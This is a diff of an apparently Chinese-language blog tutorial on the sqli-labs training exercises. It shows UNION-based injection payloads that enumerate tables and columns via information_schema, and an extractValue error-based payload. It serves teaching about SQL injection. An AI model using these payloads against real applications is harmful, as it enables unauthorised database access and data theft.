@@ -403,28 +403,18 @@
  
 </code></pre>
 <p>5.查询回显位置(id改成不存在的数字)</p>
-<pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">-1</span>‘ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
- 
- imformation_schema（数据库）包含两个数据表tables（表名），columns（列名）
- 
-
-数据库information_schema中的数据表tables下数据列table_name和数据表columns下数据列column_name
-</code></pre>
-<p> 6.查表名</p>
-<pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat（table_name）,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
- 
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">-1</span>‘ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+<p>imformation_schema（数据库）包含两个数据表tables（表名），columns（列名）</p>
+<p>数据库information_schema中的数据表tables下数据列table_name和数据表columns下数据列column_name</p>
+<p>6.查表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat（table_name）,3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
 <p>7.查列名</p>
-<pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat（column_name）,<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat（column_name）,3 from information_schema.columns where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
+
 <ol start="8">
 <li></li>
 </ol>
-<pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(所显示的列名),<span class="number">3</span> <span class="keyword">from</span> 所需要的表名</span><br></pre></td></tr></table></figure>
- 
- 
- 
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(所显示的列名),3 from 所需要的表名</span></span><br></pre></td></tr></table></figure>
 <h2 id="Less-5（报错注入）"><a href="#Less-5（报错注入）" class="headerlink" title="Less-5（报错注入）"></a>Less-5（报错注入）</h2><p>原因：后台对于输入输出的合理性没有做检查，导致返回报错中包含数据库中的内容<br><img src="https://github.com/Lin060807/images/raw/main/Less-5.png" alt="Less-5"></p>
 <p>通过添加“～”让其报错<br>查询表</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,extractValue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</span></span><br></pre></td></tr></table></figure>
